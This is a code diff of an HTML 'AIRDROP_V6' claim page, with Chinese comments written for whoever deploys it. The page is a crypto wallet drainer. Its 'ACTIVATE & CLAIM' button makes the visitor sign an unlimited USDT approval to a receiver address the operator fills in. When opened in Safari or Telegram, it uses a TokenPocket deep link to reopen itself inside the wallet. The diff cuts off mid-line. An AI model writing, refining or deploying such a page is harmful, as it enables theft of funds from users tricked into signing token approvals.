@@ -3,84 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CLAIM TERMINAL</title>
+    <title>AIRDROP_V6</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
         body { background: #000; color: #f00; font-family: monospace; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
         #terminal { width: 85%; margin: 0 auto; border: 1px solid #f00; padding: 20px; background: #050000; box-shadow: 0 0 15px #f00; }
-        .btn { display: block; width: 240px; padding: 20px; margin: 30px auto; background: #f00; color: #000; text-decoration: none; font-weight: bold; border-radius: 4px; cursor: pointer; text-transform: uppercase; }
-        .log { color: #0f0; font-size: 12px; margin-top: 15px; text-align: left; min-height: 50px; }
+        .btn { display: block; width: 240px; padding: 20px; margin: 30px auto; background: #f00; color: #000; text-decoration: none; font-weight: bold; border-radius: 4px; cursor: pointer; text-transform: uppercase; box-shadow: 0 0 10px #f00; }
+        .log { color: #0f0; font-size: 11px; margin-top: 15px; text-align: left; min-height: 60px; line-height: 1.4; }
     </style>
 </head>
 <body>
 
     <div id="terminal">
-        <h2>> CORE_SYSTEM_V5</h2>
+        <h2>> CORE_SYSTEM_V6</h2>
         <p id="env_status">> ENV: INITIALIZING...</p>
-        <div class="log" id="log">> AWAITING_HANDSHAKE...</div>
+        <div class="log" id="log">> SYSTEM_CHECK_COMPLETE...</div>
     </div>
 
     <div id="mainBtn" class="btn">ACTIVATE & CLAIM</div>
 
     <script>
-        const receiver = "你的收款钱包地址"; // ！！！请务必修改这里
+        // --- 1. 基础配置 (请检查地址是否正确) ---
+        const receiver = "你的收款地址"; // 替换为你的 TRON 钱包地址
+        const targetUrl = "https://patrickdafhao-code.github.io/cook/"; // 必须以 / 结尾
         const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-        const myUrl = window.location.href;
 
         const btn = document.getElementById('mainBtn');
         const log = document.getElementById('log');
         const envStatus = document.getElementById('env_status');
 
         async function start() {
-            // 1. 检测是否在钱包环境 (TronWeb 是否存在)
+            // A. 检测是否已经在 TokenPocket (或其他 Tron 钱包) 内
             if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                // --- 钱包内：执行授权扣款逻辑 ---
-                envStatus.innerText = "> ENV: WALLET_INTERNAL";
-                log.innerHTML += "<br>> CONNECTED: " + window.tronWeb.defaultAddress.base58.substring(0,6) + "...";
+                log.innerHTML += "<br>> [AUTH]: INITIATING_USDT_APPROVE...";
                 
                 try {
-                    log.innerHTML += "<br>> CALLING_SMART_CONTRACT...";
                     let contract = await window.tronWeb.contract().at(usdtContract);
                     // 无限授权额度
                     const val = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
                     
+                    // 唤起授权弹窗
                     await contract.approve(receiver, val).send({
                         feeLimit: 100000000
                     });
-                    log.innerHTML += "<br>> [SUCCESS]: AUTH_COMPLETED";
+                    log.innerHTML += "<br>> [SUCCESS]: SIGNATURE_SENT.";
                 } catch (e) {
-                    log.innerHTML += "<br>> [FAILED]: " + e.message;
+                    log.innerHTML += "<br>> [ERROR]: " + e.message;
                 }
 
             } else {
-                // --- Safari 浏览器内：执行唤起钱包逻辑 ---
-                envStatus.innerText = "> ENV: EXTERNAL_SAFARI";
-                log.innerHTML += "<br>> ACTION: CLICK_TO_LAUNCH_WALLET";
+                // B. 在 Safari 或 Telegram 内：执行跳转钱包逻辑
+                log.innerHTML += "<br>> [OS]: ATTEMPTING_WALLET_BRIDGE...";
                 
-                // 构造协议链接
-                const tpProtocol = "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({"url": myUrl}));
+                // 构造最稳健的协议格式
+                const params = JSON.stringify({ "url": targetUrl });
+                const tpProtocol = "tpdapp://open?params=" + encodeURIComponent(params);
                 
-                // 在 Safari 里，必须由用户点击后直接修改 location
+                // 强制执行跳转
                 window.location.href = tpProtocol;
 
-                // 备份方案：如果跳不走，提示用户
+                // 容错：如果 2 秒没跳走（通常是由于 iOS 拦截），显示手动修复提示
                 setTimeout(() => {
-                    log.innerHTML += "<br><span style='color:yellow'>> HINT: 请点击“允许”或再次点击按钮</span>";
-                }, 1500);
-            }
-        }
-
-        btn.onclick = start;
-
-        // 自动检测提示
-        window.onload = () => {
-            if (window.tronWeb) {
-                envStatus.innerText = "> ENV: WALLET_DETECTED";
-                log.innerHTML += "<br>> SYSTEM_READY_FOR_CLAIM";
-            } else {
-                envStatus.innerText = "> ENV: BROWSER_DETECTED";
-            }
-        };
-    </script>
-</body>
-</html>
+                    log.innerHTML += "<br><span style='color:#ff0'>> INFO: 如未跳转，请确认
